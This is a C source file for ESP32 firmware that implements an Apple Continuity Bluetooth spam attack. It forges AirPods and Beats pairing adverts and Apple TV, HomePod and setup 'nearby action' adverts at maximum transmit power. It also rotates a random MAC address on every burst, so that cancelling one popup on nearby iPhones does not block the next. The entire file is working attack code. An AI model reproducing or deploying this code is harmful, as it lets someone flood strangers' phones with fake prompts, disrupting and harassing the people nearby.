/**
 * Apple Spam — Flipper/Bruce-style Continuity flood.
 *
 * NearbyAction (0x0F) → Apple TV / HomePod / setup banners (longer range).
 * ProximityPair (0x07) → AirPods / Beats connect prompts (close range).
 *
 * Each burst: new random MAC + new payload so Cancel on one popup does not
 * block the next.
 */
#include "ble_apple_spam.h"

#include <string.h>
#include "esp_log.h"
#include "esp_random.h"
#include "esp_bt.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include "ble_hid_gap.h"
#include "ble_hid_keyboard.h"

#if CONFIG_BT_NIMBLE_ENABLED
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"

void ble_store_config_init(void);
#endif

static const char *TAG = "ble_apple_spam";

/** On-air dwell per burst — longer helps edge-of-range iOS catch the packet. */
#define SPAM_DWELL_MS 180

/** 4/5 bursts = NearbyAction (Apple TV / HomePod, longer range). */
#define SPAM_ACTION_SLOTS 4
#define SPAM_BURST_SLOTS  5

/* ProximityPair models — AirPods, Beats, PowerBeats (big-endian on air). */
static const uint16_t s_pp_models[] = {
    0x0220, /* AirPods */
    0x0F20, /* AirPods 2 */
    0x1320, /* AirPods 3 */
    0x0E20, /* AirPods Pro */
    0x1420, /* AirPods Pro 2 */
    0x0A20, /* AirPods Max */
    0x0320, /* PowerBeats Pro */
    0x0520, /* PowerBeats */
    0x0620, /* Solo Pro */
    0x0920, /* Beats Solo3 */
    0x0B20, /* PowerBeats3 */
    0x0C20, /* BeatsX */
    0x1020, /* Beats Flex */
    0x1120, /* Beats Studio Buds */
    0x1220, /* Beats Fit Pro */
    0x1520, /* Beats Studio Pro */
};

/* NearbyAction codes — Apple TV, HomePod, HomeKit, Vision Pro, etc. */
static const uint8_t s_na_actions[] = {
    0x01, /* Apple TV Setup */
    0x06, /* Apple TV Pair */
    0x20, /* Join This Apple TV? */
    0x2B, /* Apple ID Setup */
    0x0D, /* HomeKit Setup */
    0x13, /* Apple TV Keyboard */
    0x27, /* Connecting to Network */
    0x0B, /* HomePod Setup */
    0x09, /* Setup New Phone */
    0x02, /* Transfer Number */
    0x1E, /* TV Color Balance */
    0x24, /* Vision Pro */
    0x08, /* Watch Setup */
    0x0C, /* Wi-Fi Password Share */
    0x10, /* Apple TV Remote */
};

static volatile bool s_active;
static TaskHandle_t s_task;

#if CONFIG_BT_NIMBLE_ENABLED
static uint16_t s_last_pp_model;
static uint8_t s_last_na_action;

static void ble_host_task(void *param)
{
    (void)param;
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static int on_gap(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    (void)event;
    return 0;
}

static esp_err_t ensure_stack(void)
{
    if (ble_hid_keyboard_stack_ready()) {
        for (int i = 0; i < 50 && !ble_hs_synced(); i++) {
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        return ble_hs_synced() ? ESP_OK : ESP_ERR_TIMEOUT;
    }

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    if (ret != ESP_OK) {
        return ret;
    }

    ret = esp_hid_gap_init(HIDD_BLE_MODE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "gap init %d", ret);
        return ret;
    }

    ble_store_config_init();
    ble_hs_cfg.store_status_cb = ble_store_util_status_rr;
    ret = esp_nimble_enable(ble_host_task);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "nimble enable %d", ret);
        return ret;
    }

    for (int i = 0; i < 100 && !ble_hs_synced(); i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    if (!ble_hs_synced()) {
        ESP_LOGE(TAG, "ble host not synced");
        return ESP_ERR_TIMEOUT;
    }

    ble_hid_keyboard_mark_stack_ready();
    return ESP_OK;
}

static uint16_t pick_pp_model(void)
{
    const size_t n = sizeof(s_pp_models) / sizeof(s_pp_models[0]);
    uint16_t model;
    do {
        model = s_pp_models[esp_random() % n];
    } while (n > 1 && model == s_last_pp_model);
    s_last_pp_model = model;
    return model;
}

static uint8_t pick_na_action(void)
{
    const size_t n = sizeof(s_na_actions) / sizeof(s_na_actions[0]);
    uint8_t action;
    do {
        action = s_na_actions[esp_random() % n];
    } while (n > 1 && action == s_last_na_action);
    s_last_na_action = action;
    return action;
}

/** ProximityPair — 31 bytes, fills ADV PDU alone (no Flags AD). */
static int build_proximity_pair(uint8_t *buf)
{
    uint16_t model = pick_pp_model();
    int i = 0;
    buf[i++] = 0x1E;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x07; /* Continuity ProximityPair */
    buf[i++] = 0x19;
    buf[i++] = 0x07; /* prefix: new unpaired device */
    buf[i++] = (uint8_t)(model >> 8);
    buf[i++] = (uint8_t)(model & 0xFF);
    buf[i++] = 0x55; /* status */
    buf[i++] = (uint8_t)(((esp_random() % 10) << 4) | (esp_random() % 10)); /* buds batt */
    buf[i++] = (uint8_t)(((esp_random() % 8) << 4) | (esp_random() % 10));  /* case/chg */
    buf[i++] = (uint8_t)(esp_random() & 0xFF); /* lid counter */
    buf[i++] = 0x00; /* color */
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16); /* encrypted payload */
    i += 16;
    return i; /* 31 */
}

/** NearbyAction — Flags AD + short Continuity type 0x0F. */
static int build_nearby_action(uint8_t *buf)
{
    uint8_t action = pick_na_action();
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) {
        flags--; /* Join Apple TV variant */
    }
    if (action == 0x09 && (esp_random() & 1)) {
        flags = 0x40; /* glitched Setup New Device */
    }

    int i = 0;
    buf[i++] = 0x02;
    buf[i++] = 0x01;
    buf[i++] = 0x06; /* LE General Discoverable */

    buf[i++] = 0x0A; /* mfg AD length */
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F; /* Continuity NearbyAction */
    buf[i++] = 0x05;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    return i; /* 14 */
}

static int set_random_mac(uint8_t *out_own_type)
{
    ble_addr_t addr;
    int rc = ble_hs_id_gen_rnd(0, &addr);
    if (rc != 0) {
        return rc;
    }
    rc = ble_hs_id_set_rnd(addr.val);
    if (rc != 0) {
        return rc;
    }
    *out_own_type = BLE_OWN_ADDR_RANDOM;
    return 0;
}

static void set_max_tx_power(void)
{
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

    ESP_LOGI(TAG, "tx power idx adv=%d default=%d scan=%d (7=+9dBm)",
             esp_ble_tx_power_get(ESP_BLE_PWR_TYPE_ADV),
             esp_ble_tx_power_get(ESP_BLE_PWR_TYPE_DEFAULT),
             esp_ble_tx_power_get(ESP_BLE_PWR_TYPE_SCAN));
}

static int spam_once(int seq)
{
    if (!ble_hs_synced()) {
        return -1;
    }

    uint8_t adv[31];
    int len;
    const char *kind;
    /* 80% action (range) / 20% proximity (close AirPods) */
    if ((esp_random() % SPAM_BURST_SLOTS) < SPAM_ACTION_SLOTS) {
        len = build_nearby_action(adv);
        kind = "action";
    } else {
        len = build_proximity_pair(adv);
        kind = "pair";
    }

    (void)ble_gap_adv_stop();
    vTaskDelay(pdMS_TO_TICKS(5));

    uint8_t own_addr_type = BLE_OWN_ADDR_RANDOM;
    int rc = set_random_mac(&own_addr_type);
    if (rc != 0) {
        ESP_LOGW(TAG, "mac rotate failed rc=%d — skip burst", rc);
        return rc;
    }

    rc = ble_gap_adv_set_data(adv, len);
    if (rc != 0) {
        ESP_LOGW(TAG, "adv_set_data rc=%d len=%d", rc, len);
        return rc;
    }

    struct ble_gap_adv_params params;
    memset(&params, 0, sizeof(params));
    params.conn_mode = BLE_GAP_CONN_MODE_NON;
    params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    params.itvl_min = BLE_GAP_ADV_ITVL_MS(20);
    params.itvl_max = BLE_GAP_ADV_ITVL_MS(20);

    rc = ble_gap_adv_start(own_addr_type, NULL, BLE_HS_FOREVER, &params, on_gap, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "adv_start rc=%d", rc);
        return rc;
    }

    if ((seq % 20) == 0) {
        ESP_LOGI(TAG, "tx %s len=%d", kind, len);
    }

    vTaskDelay(pdMS_TO_TICKS(SPAM_DWELL_MS));
    (void)ble_gap_adv_stop();
    return 0;
}

static void spam_task(void *arg)
{
    (void)arg;
    s_last_pp_model = 0;
    s_last_na_action = 0xFF;

    set_max_tx_power();
    ESP_LOGI(TAG, "Apple Spam ON — BT on, phone unlocked; action=80%% for range");

    int ok = 0;
    int fail = 0;
    int seq = 0;
    while (s_active) {
        if (spam_once(seq++) == 0) {
            ok++;
            vTaskDelay(pdMS_TO_TICKS(5));
        } else {
            fail++;
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        if ((seq % 50) == 0) {
            ESP_LOGI(TAG, "stats ok=%d fail=%d", ok, fail);
        }
    }

    if (ble_hs_synced()) {
        (void)ble_gap_adv_stop();
    }
    ESP_LOGI(TAG, "Apple Spam stopped ok=%d fail=%d", ok, fail);
    s_task = NULL;
    vTaskDelete(NULL);
}
#endif

esp_err_t ble_apple_spam_start(void)
{
#if !CONFIG_BT_NIMBLE_ENABLED
    return ESP_ERR_NOT_SUPPORTED;
#else
    if (s_active) {
        return ESP_OK;
    }

    esp_err_t ret = ensure_stack();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "ensure_stack failed %d", ret);
        return ret;
    }

    ble_hid_keyboard_set_want_adv(false);
    ble_hid_keyboard_pause_adv();

    s_active = true;
    if (xTaskCreate(spam_task, "ble_apple_spam", 4096, NULL, 6, &s_task) != pdPASS) {
        s_active = false;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "Apple Spam task started");
    return ESP_OK;
#endif
}

void ble_apple_spam_stop(void)
{
    if (!s_active) {
        return;
    }
    s_active = false;
    for (int i = 0; i < 50 && s_task; i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
#if CONFIG_BT_NIMBLE_ENABLED
    if (ble_hid_keyboard_stack_ready() && ble_hs_is_enabled() && ble_hs_synced()) {
        (void)ble_gap_adv_stop();
    }
#endif
    ble_hid_keyboard_resume_adv_if_active();
}

bool ble_apple_spam_is_active(void)
{
    return s_active;
}
